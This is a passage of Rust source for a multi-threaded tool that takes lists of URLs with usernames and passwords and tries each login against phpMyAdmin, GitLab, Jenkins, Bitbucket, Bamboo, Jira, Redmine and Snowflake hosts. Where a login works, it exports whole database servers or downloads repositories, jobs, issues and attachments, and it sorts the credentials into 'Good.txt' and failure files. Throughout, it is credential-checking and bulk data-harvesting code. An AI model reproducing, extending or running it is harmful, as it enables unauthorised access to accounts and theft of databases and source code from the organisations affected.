    let mut bucket_files = std::collections::HashSet::new();
    for result in results {
        let name = if result.is_valid() {
            "Good.txt"
        } else {
            failure_bucket_filename(result.status, result.message.as_deref())
        };
        bucket_files.insert(name);
    }
    for name in bucket_files {
        let _ = fs::File::create(results_dir.join(name)).await?;
    }
    for result in results {
        append_result_bucket(results_dir, result).await?;
    }
    Ok(())
}

/// Create `{base}/Results/{timestamp}/` like the original WPF app.
pub fn create_timestamped_results_dir(base: &Path) -> PathBuf {
    let stamp = Local::now().format("%Y%m%d_%H%M%S").to_string();
    base.join("Results").join(stamp)
}

/// C#-style single-pass workflow: login → server export → bucket files.
pub async fn process_targets_combined(
    creds: Vec<Credential>,
    output_dir: PathBuf,
    config: Arc<PhpMyAdminClientConfig>,
    threads: usize,
    on_progress: Option<ProgressCallback>,
) -> Result<Vec<ScanResult>> {
    let error_log = init_run_output_dir(&output_dir).await?;
    notify_error_log(&error_log, on_progress.as_ref());
    let semaphore = Arc::new(Semaphore::new(threads.max(1)));
    let mut handles = Vec::with_capacity(creds.len());

    for cred in creds {
        let permit = semaphore.clone().acquire_owned().await?;
        let cfg = config.clone();
        let out = output_dir.clone();
        let cb = on_progress.clone();
        handles.push(tokio::spawn(async move {
            let _permit = permit;
            process_one_target(&cred, &cfg, &out, cb).await
        }));
    }

    let mut results = Vec::new();
    for handle in handles {
        results.push(handle.await?);
    }

    if let Some(ref callback) = on_progress {
        let valid = results.iter().filter(|r| r.is_valid()).count();
        callback(ProgressEvent::ScanComplete {
            valid,
            total: results.len(),
        });
        callback(ProgressEvent::AllComplete);
    }
    info!(
        "error log: {}",
        output_dir.join(ERROR_LOG_FILENAME).display()
    );

    Ok(results)
}

fn emit_scan_result(on_progress: &Option<ProgressCallback>, result: &ScanResult) {
    if let Some(ref callback) = on_progress {
        callback(ProgressEvent::ScanResult(result.clone()));
    }
}

async fn process_one_target(
    cred: &Credential,
    config: &PhpMyAdminClientConfig,
    output_dir: &Path,
    on_progress: Option<ProgressCallback>,
) -> ScanResult {
    let line = cred.display_line();
    if let Some(ref callback) = on_progress {
        callback(ProgressEvent::Log(format!("LogIn {line}")));
    }

    if cred.should_skip_short_credentials() {
        let result = ScanResult {
            credential: cred.clone(),
            status: ScanStatus::InvalidCredentials,
            message: Some("credentials too short".into()),
            databases: Vec::new(),
        };
        let _ = record_scan_result(output_dir, &result).await;
        emit_scan_result(&on_progress, &result);
        return result;
    }

    let attempts = config.login_retries.max(1);
    for attempt in 0..attempts {
        match process_attempt(cred, config, output_dir, on_progress.clone()).await {
            Ok(result) => {
                let _ = record_scan_result(output_dir, &result).await;
                emit_scan_result(&on_progress, &result);
                return result;
            }
            Err(err) if attempt + 1 < attempts => {
                if let Some(ref callback) = on_progress {
                    callback(ProgressEvent::Log(format!("RETRY {line} — {err}")));
                }
            }
            Err(err) => {
                let result = ScanResult {
                    credential: cred.clone(),
                    status: ScanStatus::Error,
                    message: Some(err.to_string()),
                    databases: Vec::new(),
                };
                let _ = record_scan_result(output_dir, &result).await;
                emit_scan_result(&on_progress, &result);
                return result;
            }
        }
    }

    let result = ScanResult {
        credential: cred.clone(),
        status: ScanStatus::Unreachable,
        message: Some("exhausted login retries".into()),
        databases: Vec::new(),
    };
    let _ = record_scan_result(output_dir, &result).await;
    emit_scan_result(&on_progress, &result);
    result
}

async fn process_attempt(
    cred: &Credential,
    config: &PhpMyAdminClientConfig,
    output_dir: &Path,
    on_progress: Option<ProgressCallback>,
) -> Result<ScanResult> {
    let mut client = PhpMyAdminClient::new(cred.url.clone(), config)?;

    if !client.detect().await? {
        return Ok(ScanResult {
            credential: cred.clone(),
            status: ScanStatus::NotPhpMyAdmin,
            message: Some("not phpMyAdmin".into()),
            databases: Vec::new(),
        });
    }

    match client.login(&cred.username, &cred.password).await? {
        LoginOutcome::Good => {
            let site_dir = cred.site_output_dir(output_dir, "pma");
            let prefix = cred.account_file_prefix();
            let leaf = format!("{prefix}__server.sql");
            let sql_path = output_file_path(&site_dir, &leaf);
            if let Some(parent) = sql_path.parent() {
                fs::create_dir_all(parent).await?;
            }
            if let Some(ref callback) = on_progress {
                callback(ProgressEvent::DumpStarted {
                    target: cred.display_line(),
                });
            }
            let bytes = client.export_server_to_file(&sql_path).await?;
            let databases = client.list_databases().await.unwrap_or_default();
            if let Some(ref callback) = on_progress {
                callback(ProgressEvent::DumpComplete {
                    target: cred.display_line(),
                    files: 1,
                    bytes: Some(bytes),
                });
            }
            Ok(ScanResult {
                credential: cred.clone(),
                status: ScanStatus::Valid,
                message: None,
                databases,
            })
        }
        LoginOutcome::Invalid => Ok(ScanResult {
            credential: cred.clone(),
            status: ScanStatus::NotPhpMyAdmin,
            message: None,
            databases: Vec::new(),
        }),
        LoginOutcome::Captcha => Ok(ScanResult {
            credential: cred.clone(),
            status: ScanStatus::Captcha,
            message: None,
            databases: Vec::new(),
        }),
        LoginOutcome::Bad => Ok(ScanResult {
            credential: cred.clone(),
            status: ScanStatus::InvalidCredentials,
            message: None,
            databases: Vec::new(),
        }),
    }
}

pub async fn dump_targets(
    targets: Vec<ScanResult>,
    output: PathBuf,
    config: Arc<PhpMyAdminClientConfig>,
    threads: usize,
    record_valid: bool,
    on_progress: Option<ProgressCallback>,
) -> Result<()> {
    let valid: Vec<_> = targets.into_iter().filter(|t| t.is_valid()).collect();
    if valid.is_empty() {
        let msg = "no valid targets to dump".to_string();
        if let Some(ref callback) = on_progress {
            callback(ProgressEvent::Log(msg));
        } else {
            warn!("no valid targets to dump");
        }
        return Ok(());
    }

    fs::create_dir_all(&output).await?;
    if record_valid {
        let error_log = init_run_output_dir(&output).await?;
        notify_error_log(&error_log, on_progress.as_ref());
    }
    let semaphore = Arc::new(Semaphore::new(threads.max(1)));
    let mut handles = Vec::with_capacity(valid.len());

    for target in valid {
        let permit = semaphore.clone().acquire_owned().await?;
        let cfg = config.clone();
        let out = output.clone();
        let cb = on_progress.clone();
        let cred = target.credential.clone();
        let target_line = cred.display_line();
        handles.push(tokio::spawn(async move {
            let _permit = permit;
            if let Some(ref callback) = cb {
                callback(ProgressEvent::DumpStarted {
                    target: target_line.clone(),
                });
            }
            let dbs = if target.databases.is_empty() {
                None
            } else {
                Some(target.databases.as_slice())
            };
            match dump_databases(&cred, &cfg, &out, dbs).await {
                Ok(files) => {
                    let result = ScanResult {
                        credential: cred.clone(),
                        status: if files.is_empty() {
                            ScanStatus::Error
                        } else {
                            ScanStatus::Valid
                        },
                        message: if files.is_empty() {
                            Some("no databases exported".into())
                        } else {
                            None
                        },
                        databases: target.databases.clone(),
                    };
                    if record_valid {
                        let _ = record_scan_result(&out, &result).await;
                    }
                    emit_scan_result(&cb, &result);
                    if let Some(ref callback) = cb {
                        callback(ProgressEvent::DumpComplete {
                            target: target_line.clone(),
                            files: files.len(),
                            bytes: None,
                        });
                    } else {
                        info!("DUMPED {} — {} files", target_line, files.len());
                    }
                }
                Err(err) => {
                    let result = ScanResult {
                        credential: cred.clone(),
                        status: ScanStatus::Error,
                        message: Some(err.to_string()),
                        databases: target.databases.clone(),
                    };
                    if record_valid {
                        let _ = record_scan_result(&out, &result).await;
                    }
                    emit_scan_result(&cb, &result);
                    if let Some(ref callback) = cb {
                        callback(ProgressEvent::DumpFailed {
                            target: target_line.clone(),
                            error: err.to_string(),
                        });
                    } else {
                        warn!("DUMP FAIL {} — {}", target_line, err);
                    }
                }
            }
        }));
    }

    for handle in handles {
        let _ = handle.await;
    }

    if let Some(ref callback) = on_progress {
        callback(ProgressEvent::AllComplete);
    }
    if record_valid {
        info!(
            "error log: {}",
            output.join(ERROR_LOG_FILENAME).display()
        );
    }

    Ok(())
}

pub async fn load_gitlab_list_summary(path: &Path) -> Result<GitLabParseSummary> {
    let content = read_list_file(path).await?;
    let summary = parse_gitlab_list_summary(&content)?;
    if summary.credentials.is_empty() {
        anyhow::bail!(
            "no valid GitLab targets in {} ({} lines checked, {} skipped, {} non-gitlab hosts filtered)",
            path.display(),
            summary.total_lines,
            summary.skipped,
            summary.filtered_non_gitlab
        );
    }
    if summary.filtered_non_gitlab > 0 || summary.skipped > 0 {
        info!(
            "GitLab list {}: {} targets, {} skipped, {} non-gitlab filtered",
            path.display(),
            summary.credentials.len(),
            summary.skipped,
            summary.filtered_non_gitlab
        );
    }
    Ok(summary)
}

pub async fn load_gitlab_list(path: &Path) -> Result<Vec<Credential>> {
    Ok(load_gitlab_list_summary(path).await?.credentials)
}

pub async fn download_gitlab_projects(
    creds: Vec<Credential>,
    output: PathBuf,
    config: Arc<GitLabClientConfig>,
    threads: usize,
    download_files: bool,
    on_progress: Option<ProgressCallback>,
    cancel: Option<Arc<AtomicBool>>,
) -> Result<()> {
    let error_log = init_run_output_dir(&output).await?;
    notify_error_log(&error_log, on_progress.as_ref());
    let semaphore = Arc::new(Semaphore::new(threads.max(1)));
    let mut handles = Vec::with_capacity(creds.len());

    for cred in creds {
        if cancelled(&cancel) {
            break;
        }
        let permit = semaphore.clone().acquire_owned().await?;
        let cfg = config.clone();
        let out = output.clone();
        let cb = on_progress.clone();
        let cancel_task = cancel.clone();
        let target_line = cred.display_line();
        handles.push(tokio::spawn(async move {
            let _permit = permit;
            if cancelled(&cancel_task) {
                return;
            }
            if let Some(ref callback) = cb {
                callback(ProgressEvent::DumpStarted {
                    target: target_line.clone(),
                });
            }
            match download_personal_projects(&cred, &cfg, &out, download_files).await {
                Ok((stats, files)) => {
                    let detail = stats.detail_line();
                    let (status, message) = if download_files {
                        if files.is_empty() {
                            (
                                ScanStatus::Error,
                                "no owned GitLab projects downloaded".to_string(),
                            )
                        } else {
                            (ScanStatus::Valid, detail)
                        }
                    } else {
                        (ScanStatus::Valid, format!("check ok — {detail}"))
                    };
                    let result = ScanResult {
                        credential: cred.clone(),
                        status,
                        message: Some(message),
                        databases: Vec::new(),
                    };
                    let _ = record_scan_result(&out, &result).await;
                    emit_scan_result(&cb, &result);
                    if let Some(ref callback) = cb {
                        if result.status == ScanStatus::Valid {
                            callback(ProgressEvent::Good {
                                target: target_line.clone(),
                                detail: result.message.clone().unwrap_or_default(),
                                bytes: if download_files {
                                    Some(stats.bytes)
                                } else {
                                    None
                                },
                            });
                        }
                        callback(ProgressEvent::DumpComplete {
                            target: target_line.clone(),
                            files: files.len(),
                            bytes: Some(stats.bytes),
                        });
                    } else {
                        info!(
                            "GITLAB {} — {}",
                            target_line,
                            stats.detail_line()
                        );
                    }
                }
                Err(err) => {
                    let result = ScanResult {
                        credential: cred.clone(),
                        status: ScanStatus::Error,
                        message: Some(err.to_string()),
                        databases: Vec::new(),
                    };
                    let _ = record_scan_result(&out, &result).await;
                    emit_scan_result(&cb, &result);
                    if let Some(ref callback) = cb {
                        callback(ProgressEvent::DumpFailed {
                            target: target_line.clone(),
                            error: err.to_string(),
                        });
                    } else {
                        warn!("GITLAB FAIL {} — {}", target_line, err);
                    }
                }
            }
        }));
    }

    await_download_handles(handles, &cancel).await;

    if let Some(ref callback) = on_progress {
        callback(ProgressEvent::AllComplete);
    }
    info!(
        "error log: {}",
        output.join(ERROR_LOG_FILENAME).display()
    );

    Ok(())
}

pub async fn load_jenkins_list_summary(path: &Path) -> Result<JenkinsParseSummary> {
    let content = read_list_file(path).await?;
    let summary = parse_jenkins_list_summary(&content)?;
    if summary.credentials.is_empty() {
        anyhow::bail!(
            "no valid Jenkins targets in {} ({} lines checked, {} skipped, {} non-jenkins hosts filtered)",
            path.display(),
            summary.total_lines,
            summary.skipped,
            summary.filtered_non_jenkins
        );
    }
    if summary.filtered_non_jenkins > 0 {
        info!(
            "Jenkins list {}: filtered {} lines where hostname does not contain `jenkins`",
            path.display(),
            summary.filtered_non_jenkins
        );
    }
    Ok(summary)
}

pub async fn load_jenkins_list(path: &Path) -> Result<Vec<Credential>> {
    Ok(load_jenkins_list_summary(path).await?.credentials)
}

pub async fn download_jenkins_jobs(
    creds: Vec<Credential>,
    output: PathBuf,
    config: Arc<JenkinsClientConfig>,
    threads: usize,
    download_files: bool,
    on_progress: Option<ProgressCallback>,
    cancel: Option<Arc<AtomicBool>>,
) -> Result<()> {
    let error_log = init_run_output_dir(&output).await?;
    notify_error_log(&error_log, on_progress.as_ref());
    let semaphore = Arc::new(Semaphore::new(threads.max(1)));
    let mut handles = Vec::with_capacity(creds.len());

    for cred in creds {
        if cancelled(&cancel) {
            break;
        }
        let permit = semaphore.clone().acquire_owned().await?;
        let cfg = config.clone();
        let out = output.clone();
        let cb = on_progress.clone();
        let cancel_task = cancel.clone();
        let target_line = cred.display_line();
        handles.push(tokio::spawn(async move {
            let _permit = permit;
            if cancelled(&cancel_task) {
                return;
            }
            if let Some(ref callback) = cb {
                callback(ProgressEvent::DumpStarted {
                    target: target_line.clone(),
                });
            }
            match download_personal_jobs(&cred, &cfg, &out, download_files).await {
                Ok((stats, jobs)) => {
                    let detail = stats.detail_line();
                    let message = if download_files {
                        detail
                    } else {
                        format!("check ok — {detail}")
                    };
                    let result = ScanResult {
                        credential: cred.clone(),
                        status: ScanStatus::Valid,
                        message: Some(message.clone()),
                        databases: Vec::new(),
                    };
                    let _ = record_scan_result(&out, &result).await;
                    emit_scan_result(&cb, &result);
                    if let Some(ref callback) = cb {
                        callback(ProgressEvent::Good {
                            target: target_line.clone(),
                            detail: message,
                            bytes: if download_files {
                                Some(stats.bytes)
                            } else {
                                None
                            },
                        });
                        callback(ProgressEvent::DumpComplete {
                            target: target_line.clone(),
                            files: jobs.len(),
                            bytes: Some(stats.bytes),
                        });
                    } else {
                        info!(
                            "JENKINS {} — {}",
                            target_line,
                            stats.detail_line()
                        );
                    }
                }
                Err(err) => {
                    let result = ScanResult {
                        credential: cred.clone(),
                        status: ScanStatus::Error,
                        message: Some(err.to_string()),
                        databases: Vec::new(),
                    };
                    let _ = record_scan_result(&out, &result).await;
                    emit_scan_result(&cb, &result);
                    if let Some(ref callback) = cb {
                        callback(ProgressEvent::DumpFailed {
                            target: target_line.clone(),
                            error: err.to_string(),
                        });
                    } else {
                        warn!("JENKINS FAIL {} — {}", target_line, err);
                    }
                }
            }
        }));
    }

    await_download_handles(handles, &cancel).await;

    if let Some(ref callback) = on_progress {
        callback(ProgressEvent::AllComplete);
    }
    info!(
        "error log: {}",
        output.join(ERROR_LOG_FILENAME).display()
    );

    Ok(())
}

pub async fn load_bitbucket_list_summary(path: &Path) -> Result<BitbucketParseSummary> {
    let content = read_list_file(path).await?;
    let summary = parse_bitbucket_list_summary(&content)?;
    if summary.credentials.is_empty() {
        anyhow::bail!(
            "no valid Bitbucket targets in {} ({} lines checked, {} skipped, {} cloud filtered, {} non-bitbucket filtered)",
            path.display(),
            summary.total_lines,
            summary.skipped,
            summary.filtered_cloud,
            summary.filtered_non_bitbucket
        );
    }
    if summary.filtered_cloud > 0 || summary.filtered_non_bitbucket > 0 {
        info!(
            "Bitbucket list {}: filtered {} Bitbucket Cloud / glued org lines, {} non-bitbucket hosts",
            path.display(),
            summary.filtered_cloud,
            summary.filtered_non_bitbucket
        );
    }
    Ok(summary)
}

pub async fn load_bitbucket_list(path: &Path) -> Result<Vec<Credential>> {
    Ok(load_bitbucket_list_summary(path).await?.credentials)
}

pub async fn download_bitbucket_repos(
    creds: Vec<Credential>,
    output: PathBuf,
    config: Arc<BitbucketClientConfig>,
    threads: usize,
    download_files: bool,
    on_progress: Option<ProgressCallback>,
    cancel: Option<Arc<AtomicBool>>,
) -> Result<()> {
    let error_log = init_run_output_dir(&output).await?;
    notify_error_log(&error_log, on_progress.as_ref());
    let semaphore = Arc::new(Semaphore::new(threads.max(1)));
    let mut handles = Vec::with_capacity(creds.len());

    for cred in creds {
        if cancelled(&cancel) {
            break;
        }
        let permit = semaphore.clone().acquire_owned().await?;
        let cfg = config.clone();
        let out = output.clone();
        let cb = on_progress.clone();
        let cancel_task = cancel.clone();
        let target_line = cred.display_line();
        handles.push(tokio::spawn(async move {
            let _permit = permit;
            if cancelled(&cancel_task) {
                return;
            }
            if let Some(ref callback) = cb {
                callback(ProgressEvent::DumpStarted {
                    target: target_line.clone(),
                });
            }
            match download_personal_repos(&cred, &cfg, &out, download_files).await {
                Ok((stats, files)) => {
                    let detail = stats.detail_line();
                    let (status, message) = if download_files {
                        if files.is_empty() {
                            (
                                ScanStatus::Error,
                                "no owned Bitbucket repos downloaded".to_string(),
                            )
                        } else {
                            (ScanStatus::Valid, detail)
                        }
                    } else {
                        (ScanStatus::Valid, format!("check ok — {detail}"))
                    };
                    let result = ScanResult {
                        credential: cred.clone(),
                        status,
                        message: Some(message.clone()),
                        databases: Vec::new(),
                    };
                    let _ = record_scan_result(&out, &result).await;
                    emit_scan_result(&cb, &result);
                    if let Some(ref callback) = cb {
                        if result.status == ScanStatus::Valid {
                            callback(ProgressEvent::Good {
                                target: target_line.clone(),
                                detail: message,
                                bytes: if download_files {
                                    Some(stats.bytes)
                                } else {
                                    None
                                },
                            });
                        }
                        callback(ProgressEvent::DumpComplete {
                            target: target_line.clone(),
                            files: files.len(),
                            bytes: Some(stats.bytes),
                        });
                    } else {
                        info!(
                            "BITBUCKET {} — {}",
                            target_line,
                            stats.detail_line()
                        );
                    }
                }
                Err(err) => {
                    let result = ScanResult {
                        credential: cred.clone(),
                        status: ScanStatus::Error,
                        message: Some(err.to_string()),
                        databases: Vec::new(),
                    };
                    let _ = record_scan_result(&out, &result).await;
                    emit_scan_result(&cb, &result);
                    if let Some(ref callback) = cb {
                        callback(ProgressEvent::DumpFailed {
                            target: target_line.clone(),
                            error: err.to_string(),
                        });
                    } else {
                        warn!("BITBUCKET FAIL {} — {}", target_line, err);
                    }
                }
            }
        }));
    }

    await_download_handles(handles, &cancel).await;

    if let Some(ref callback) = on_progress {
        callback(ProgressEvent::AllComplete);
    }
    info!(
        "error log: {}",
        output.join(ERROR_LOG_FILENAME).display()
    );

    Ok(())
}

pub async fn load_bamboo_list_summary(path: &Path) -> Result<BambooParseSummary> {
    let content = read_list_file(path).await?;
    let summary = parse_bamboo_list_summary(&content)?;
    if summary.credentials.is_empty() {
        anyhow::bail!(
            "no valid Bamboo targets in {} ({} lines checked, {} skipped, {} non-bamboo filtered)",
            path.display(),
            summary.total_lines,
            summary.skipped,
            summary.filtered_non_bamboo
        );
    }
    if summary.filtered_non_bamboo > 0 {
        info!(
            "Bamboo list {}: filtered {} lines where hostname does not contain `bamboo`",
            path.display(),
            summary.filtered_non_bamboo
        );
    }
    Ok(summary)
}

pub async fn load_bamboo_list(path: &Path) -> Result<Vec<Credential>> {
    Ok(load_bamboo_list_summary(path).await?.credentials)
}

pub async fn download_bamboo_exports(
    creds: Vec<Credential>,
    output: PathBuf,
    config: Arc<BambooClientConfig>,
    threads: usize,
    download_files: bool,
    on_progress: Option<ProgressCallback>,
    cancel: Option<Arc<AtomicBool>>,
) -> Result<()> {
    let error_log = init_run_output_dir(&output).await?;
    notify_error_log(&error_log, on_progress.as_ref());
    let semaphore = Arc::new(Semaphore::new(threads.max(1)));
    let mut handles = Vec::with_capacity(creds.len());

    for cred in creds {
        if cancelled(&cancel) {
            break;
        }
        let permit = semaphore.clone().acquire_owned().await?;
        let cfg = config.clone();
        let out = output.clone();
        let cb = on_progress.clone();
        let cancel_task = cancel.clone();
        let target_line = cred.display_line();
        handles.push(tokio::spawn(async move {
            let _permit = permit;
            if cancelled(&cancel_task) {
                return;
            }
            if let Some(ref callback) = cb {
                callback(ProgressEvent::DumpStarted {
                    target: target_line.clone(),
                });
            }
            match download_bamboo_account(&cred, &cfg, &out, download_files).await {
                Ok((stats, files)) => {
                    let detail = stats.detail_line();
                    let (status, message) = if download_files {
                        if stats.backend != "atlassian" && stats.backend != "s3" {
                            (
                                ScanStatus::Error,
                                format!(
                                    "not Atlassian Bamboo CI (backend={})",
                                    stats.backend
                                ),
                            )
                        } else if files.is_empty() && stats.backend == "s3" {
                            (
                                ScanStatus::Valid,
                                if stats.plans > 0 {
                                    format!("S3 ok — {detail} (no objects downloaded)")
                                } else {
                                    format!("S3 ok — {detail} (authenticated, no buckets/objects)")
                                },
                            )
                        } else if files.is_empty() && stats.artifacts == 0 && stats.plans == 0 {
                            (
                                ScanStatus::Error,
                                "no Bamboo plans or artifacts downloaded".to_string(),
                            )
                        } else if files.is_empty() {
                            (
                                ScanStatus::Error,
                                "no Bamboo output files written".to_string(),
                            )
                        } else {
                            (ScanStatus::Valid, detail)
                        }
                    } else if stats.backend != "atlassian" && stats.backend != "s3" {
                        (
                            ScanStatus::Error,
                            format!(
                                "not Atlassian Bamboo CI (backend={})",
                                stats.backend
                            ),
                        )
                    } else if stats.backend == "s3" {
                        (
                            ScanStatus::Valid,
                            format!("check ok — {detail}"),
                        )
                    } else if stats.backend == "atlassian" && stats.plans == 0 {
                        (
                            ScanStatus::Error,
                            "Bamboo: authenticated but no build plans visible".to_string(),
                        )
                    } else {
                        (ScanStatus::Valid, format!("check ok — {detail}"))
                    };
                    let result = ScanResult {
                        credential: cred.clone(),
                        status,
                        message: Some(message.clone()),
                        databases: Vec::new(),
                    };
                    let _ = record_scan_result(&out, &result).await;
                    emit_scan_result(&cb, &result);
                    if let Some(ref callback) = cb {
                        if result.status == ScanStatus::Valid {
                            callback(ProgressEvent::Good {
                                target: target_line.clone(),
                                detail: message,
                                bytes: if download_files {
                                    Some(stats.bytes)
                                } else {
                                    None
                                },
                            });
                        }
                        callback(ProgressEvent::DumpComplete {
                            target: target_line.clone(),
                            files: files.len(),
                            bytes: Some(stats.bytes),
                        });
                    } else {
                        info!("BAMBOO {} — {}", target_line, stats.detail_line());
                    }
                }
                Err(err) => {
                    let result = ScanResult {
                        credential: cred.clone(),
                        status: ScanStatus::Error,
                        message: Some(err.to_string()),
                        databases: Vec::new(),
                    };
                    let _ = record_scan_result(&out, &result).await;
                    emit_scan_result(&cb, &result);
                    if let Some(ref callback) = cb {
                        callback(ProgressEvent::DumpFailed {
                            target: target_line.clone(),
                            error: err.to_string(),
                        });
                    } else {
                        warn!("BAMBOO FAIL {} — {}", target_line, err);
                    }
                }
            }
        }));
    }

    await_download_handles(handles, &cancel).await;

    if let Some(ref callback) = on_progress {
        callback(ProgressEvent::AllComplete);
    }
    info!(
        "error log: {}",
        output.join(ERROR_LOG_FILENAME).display()
    );

    Ok(())
}

pub async fn load_jira_list_summary(path: &Path) -> Result<JiraParseSummary> {
    let content = read_list_file(path).await?;
    let summary = parse_jira_list_summary(&content)?;
    if summary.credentials.is_empty() {
        anyhow::bail!(
            "no valid Jira targets in {} ({} lines checked, {} skipped, {} non-jira filtered)",
            path.display(),
            summary.total_lines,
            summary.skipped,
            summary.filtered_non_jira
        );
    }
    if summary.filtered_non_jira > 0 {
        info!(
            "Jira list {}: filtered {} lines where hostname does not contain `jira` or *.atlassian.net",
            path.display(),
            summary.filtered_non_jira
        );
    }
    Ok(summary)
}

pub async fn load_jira_list(path: &Path) -> Result<Vec<Credential>> {
    Ok(load_jira_list_summary(path).await?.credentials)
}

pub async fn download_jira_exports(
    creds: Vec<Credential>,
    output: PathBuf,
    config: Arc<JiraClientConfig>,
    threads: usize,
    download_files: bool,
    on_progress: Option<ProgressCallback>,
    cancel: Option<Arc<AtomicBool>>,
) -> Result<()> {
    let error_log = init_run_output_dir(&output).await?;
    notify_error_log(&error_log, on_progress.as_ref());
    let semaphore = Arc::new(Semaphore::new(threads.max(1)));
    let mut handles = Vec::with_capacity(creds.len());

    for cred in creds {
        if cancelled(&cancel) {
            break;
        }
        let permit = semaphore.clone().acquire_owned().await?;
        let cfg = config.clone();
        let out = output.clone();
        let cb = on_progress.clone();
        let cancel_task = cancel.clone();
        let target_line = cred.display_line();
        handles.push(tokio::spawn(async move {
            let _permit = permit;
            if cancelled(&cancel_task) {
                return;
            }
            if let Some(ref callback) = cb {
                callback(ProgressEvent::DumpStarted {
                    target: target_line.clone(),
                });
            }
            match download_jira_projects(&cred, &cfg, &out, download_files).await {
                Ok((stats, files)) => {
                    let detail = stats.detail_line();
                    let (status, message) = if download_files {
                        let has_output = !files.is_empty() || stats.attachments > 0;
                        if has_output {
                            (ScanStatus::Valid, detail)
                        } else {
                            (
                                ScanStatus::Error,
                                "no Jira project exports or attachments downloaded".to_string(),
                            )
                        }
                    } else {
                        (ScanStatus::Valid, format!("check ok — {detail}"))
                    };
                    let result = ScanResult {
                        credential: cred.clone(),
                        status,
                        message: Some(message.clone()),
                        databases: Vec::new(),
                    };
                    let _ = record_scan_result(&out, &result).await;
                    emit_scan_result(&cb, &result);
                    if let Some(ref callback) = cb {
                        if result.status == ScanStatus::Valid {
                            callback(ProgressEvent::Good {
                                target: target_line.clone(),
                                detail: message,
                                bytes: if download_files {
                                    Some(stats.bytes)
                                } else {
                                    None
                                },
                            });
                        }
                        callback(ProgressEvent::DumpComplete {
                            target: target_line.clone(),
                            files: files.len() + stats.attachments,
                            bytes: Some(stats.bytes),
                        });
                    } else {
                        info!("JIRA {} — {}", target_line, stats.detail_line());
                    }
                }
                Err(err) => {
                    let result = ScanResult {
                        credential: cred.clone(),
                        status: ScanStatus::Error,
                        message: Some(err.to_string()),
                        databases: Vec::new(),
                    };
                    let _ = record_scan_result(&out, &result).await;
                    emit_scan_result(&cb, &result);
                    if let Some(ref callback) = cb {
                        callback(ProgressEvent::DumpFailed {
                            target: target_line.clone(),
                            error: err.to_string(),
                        });
                    } else {
                        warn!("JIRA FAIL {} — {}", target_line, err);
                    }
                }
            }
        }));
    }

    await_download_handles(handles, &cancel).await;

    if let Some(ref callback) = on_progress {
        callback(ProgressEvent::AllComplete);
    }
    info!(
        "error log: {}",
        output.join(ERROR_LOG_FILENAME).display()
    );

    Ok(())
}

pub async fn load_redmine_list_summary(path: &Path) -> Result<RedmineParseSummary> {
    let content = read_list_file(path).await?;
    let summary = parse_redmine_list_summary(&content)?;
    if summary.credentials.is_empty() {
        anyhow::bail!(
            "no valid Redmine targets in {} ({} lines checked, {} skipped, {} non-redmine filtered)",
            path.display(),
            summary.total_lines,
            summary.skipped,
            summary.filtered_non_redmine
        );
    }
    if summary.filtered_non_redmine > 0 {
        info!(
            "Redmine list {}: filtered {} lines (hostname not Redmine)",
            path.display(),
            summary.filtered_non_redmine
        );
    }
    Ok(summary)
}

pub async fn download_redmine_exports(
    creds: Vec<Credential>,
    output: PathBuf,
    config: Arc<RedmineClientConfig>,
    threads: usize,
    download_files: bool,
    export_options: RedmineExportOptions,
    on_progress: Option<ProgressCallback>,
    cancel: Option<Arc<AtomicBool>>,
) -> Result<()> {
    let error_log = init_run_output_dir(&output).await?;
    notify_error_log(&error_log, on_progress.as_ref());
    let semaphore = Arc::new(Semaphore::new(threads.max(1)));
    let mut handles = Vec::with_capacity(creds.len());

    for cred in creds {
        if cancelled(&cancel) {
            break;
        }
        let permit = semaphore.clone().acquire_owned().await?;
        let cfg = config.clone();
        let out = output.clone();
        let cb = on_progress.clone();
        let cancel_task = cancel.clone();
        let target_line = cred.display_line();
        let export_options = export_options;
        handles.push(tokio::spawn(async move {
            let _permit = permit;
            if cancelled(&cancel_task) {
                return;
            }
            if let Some(ref callback) = cb {
                callback(ProgressEvent::DumpStarted {
                    target: target_line.clone(),
                });
            }
            match download_redmine_projects(&cred, &cfg, &out, download_files, export_options).await {
                Ok((stats, files)) => {
                    let detail = stats.detail_line();
                    let (status, message) = if download_files {
                        let got_data = !files.is_empty()
                            || (export_options.issues && stats.issues_exported > 0)
                            || (export_options.wiki && stats.wiki_pages > 0)
                            || (export_options.attachments && stats.attachments > 0);
                        if got_data {
                            (ScanStatus::Valid, detail)
                        } else if !export_options.any_selected() {
                            (
                                ScanStatus::Error,
                                "Redmine export: no categories selected (issues / attachments / wiki)".to_string(),
                            )
                        } else {
                            (
                                ScanStatus::Error,
                                "no Redmine exports downloaded for selected categories".to_string(),
                            )
                        }
                    } else {
                        (ScanStatus::Valid, format!("check ok — {detail}"))
                    };
                    let result = ScanResult {
                        credential: cred.clone(),
                        status,
                        message: Some(message.clone()),
                        databases: Vec::new(),
                    };
                    let _ = record_scan_result(&out, &result).await;
                    emit_scan_result(&cb, &result);
                    if let Some(ref callback) = cb {
                        if result.status == ScanStatus::Valid {
                            callback(ProgressEvent::Good {
                                target: target_line.clone(),
                                detail: message,
                                bytes: if download_files {
                                    Some(stats.bytes)
                                } else {
                                    None
                                },
                            });
                        }
                        callback(ProgressEvent::DumpComplete {
                            target: target_line.clone(),
                            files: files.len(),
                            bytes: Some(stats.bytes),
                        });
                    }
                }
                Err(err) => {
                    let result = ScanResult {
                        credential: cred.clone(),
                        status: ScanStatus::Error,
                        message: Some(err.to_string()),
                        databases: Vec::new(),
                    };
                    let _ = record_scan_result(&out, &result).await;
                    emit_scan_result(&cb, &result);
                    if let Some(ref callback) = cb {
                        callback(ProgressEvent::DumpFailed {
                            target: target_line.clone(),
                            error: err.to_string(),
                        });
                    }
                }
            }
        }));
    }

    await_download_handles(handles, &cancel).await;
    if let Some(ref callback) = on_progress {
        callback(ProgressEvent::AllComplete);
    }
    info!(
        "error log: {}",
        output.join(ERROR_LOG_FILENAME).display()
    );
    Ok(())
}

pub async fn load_snowflake_list_summary(path: &Path) -> Result<SnowflakeParseSummary> {
    let content = read_list_file(path).await?;
    let summary = parse_snowflake_list_summary(&content)?;
    if summary.credentials.is_empty() {
        anyhow::bail!(
            "no valid Snowflake targets in {} ({} lines checked, {} skipped, {} non-snowflake filtered)",
            path.display(),
            summary.total_lines,
            summary.skipped,
            summary.filtered_non_snowflake
        );
    }
    if summary.filtered_non_snowflake > 0 {
        info!(
            "Snowflake list {}: filtered {} lines (hostname not Snowflake)",
            path.display(),
            summary.filtered_non_snowflake
        );
    }
    Ok(summary)
}

pub async fn download_snowflake_exports(
    creds: Vec<Credential>,
    output: PathBuf,
    config: Arc<SnowflakeClientConfig>,
    threads: usize,
